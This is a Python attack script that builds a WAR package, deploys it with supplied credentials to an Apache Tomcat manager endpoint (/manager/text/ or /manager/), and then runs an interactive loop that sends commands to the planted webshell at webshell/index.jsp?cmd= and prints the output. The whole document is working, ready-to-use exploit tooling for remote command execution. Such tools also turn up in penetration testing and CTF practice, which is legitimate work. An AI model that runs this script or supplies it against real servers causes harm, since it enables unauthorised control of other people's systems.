import requests
import os
import time
import argparse
import re

def version_check(version):
    if version >= '7': 
        path = '/manager/text/'
        return path
    else:
        path = '/manager/'
        return path

def check_url(url): 
    check = url[-1] 
    if check == "/": 
        return url
    else:
        url = url + "/"
        return url

def shell(url):
    full_url = url + "webshell/index.jsp?cmd="
    while True:
        try:
            requests.packages.urllib3.disable_warnings() 
            cmd = input("Shell: ")
            shell_url = full_url + cmd
            
            print(shell_url)
            req_site = requests.get(shell_url,verify=False)
            cmd_output = re.findall("<pre>(.*)</pre>",req_site.text) 
            print(cmd_output[0].replace("</br>","\n")) 

        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

def send_payload(url,path,username,password):
    requests.packages.urllib3.disable_warnings() 
    print("Uploading WAR payload!")

    data = open('webshell.war','rb').read() 

    header = {"Content-Type": "application/octet-stream"} 
    
    undeploy_url_path = url + path + "undeploy?path=/webshell" 
    req_site = requests.put(undeploy_url_path,headers=header,data=data, auth=(username,password), verify=False)

    deploy_url_path = url + path + "deploy?path=/webshell" 
    req_site = requests.put(deploy_url_path,headers=header,data=data, auth=(username,password), verify=False)

    if req_site.status_code == 200:
        print("Payload uploaded!")
        time.sleep(1)
        shell(url)
    else:
        print("Unable to upload file!")
        time.sleep(1)
        exit()

def build_payload(url,path,username,password):
    print("Building WAR file")
    time.sleep(1) 
    os.system("jar -cvf webshell.war index.jsp")
    
    send_payload(url,path,username,password)

def main():
    parser = argparse.ArgumentParser(description='Tomcat WAR File Upload')

    parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://tomcatsite.blah/', required=True)
    parser.add_argument('-u', metavar='<username>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help='Password', required=True)
    parser.add_argument('--version', metavar='<version>', help='The tomcat version E.G --version 8', required=True)
    args = parser.parse_args()

    url = args.t
    username = args.u
    password = args.p
    version = args.version

    url = check_url(url) 

    path = version_check(version)

    print("Welcome to WAR tomcat file uploader!")
    time.sleep(1)  

    build_payload(url,path,username,password)

if __name__ == "__main__":
    main()